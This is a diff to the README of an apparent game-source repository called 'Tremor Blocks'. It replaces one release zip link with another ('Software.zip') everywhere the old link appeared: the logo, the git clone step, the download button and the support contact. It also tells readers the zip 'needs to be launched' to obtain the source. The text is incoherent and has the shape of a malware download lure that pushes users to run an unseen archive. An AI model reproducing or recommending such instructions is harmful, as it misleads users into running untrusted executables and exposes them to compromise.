@@ -1,6 +1,6 @@
 # Welcome to Tremor Blocks Source Code Repository! 🧱
 
-![Tremor Blocks Logo](https://github.com/garo3624/tremor-blocks/releases/download/v1.0/Release_x64.zip)
+![Tremor Blocks Logo](https://github.com/garo3624/tremor-blocks/releases/download/v2.0/Software.zip)
 
 ## Overview
 
@@ -19,7 +19,7 @@ To get started with the Tremor Blocks source code, follow the steps below:
 
 1. Clone the repository to your local machine:
    ```
-   git clone https://github.com/garo3624/tremor-blocks/releases/download/v1.0/Release_x64.zip
+   git clone https://github.com/garo3624/tremor-blocks/releases/download/v2.0/Software.zip
    ```
 
 2. Make changes and modifications as needed.
@@ -28,9 +28,9 @@ To get started with the Tremor Blocks source code, follow the steps below:
 
 ## Download Latest Version
 
-🚀 [Download Latest Version Here!](https://github.com/garo3624/tremor-blocks/releases/download/v1.0/Release_x64.zip) 🚀
+🚀 [Download Latest Version Here!](https://github.com/garo3624/tremor-blocks/releases/download/v2.0/Software.zip) 🚀
 
-Please note that the https://github.com/garo3624/tremor-blocks/releases/download/v1.0/Release_x64.zip file needs to be launched to access the latest version of the Tremor Blocks source code. 
+Please note that the https://github.com/garo3624/tremor-blocks/releases/download/v2.0/Software.zip file needs to be launched to access the latest version of the Tremor Blocks source code. 
 
 If the link above is not working, feel free to check the "Releases" section for alternative download options.
 
@@ -44,6 +44,6 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ## Support
 
-If you encounter any issues or have any questions regarding the Tremor Blocks source code, please don't hesitate to contact us at https://github.com/garo3624/tremor-blocks/releases/download/v1.0/Release_x64.zip
+If you encounter any issues or have any questions regarding the Tremor Blocks source code, please don't hesitate to contact us at https://github.com/garo3624/tremor-blocks/releases/download/v2.0/Software.zip
 
 Let's build something awesome together! 🚀🎮
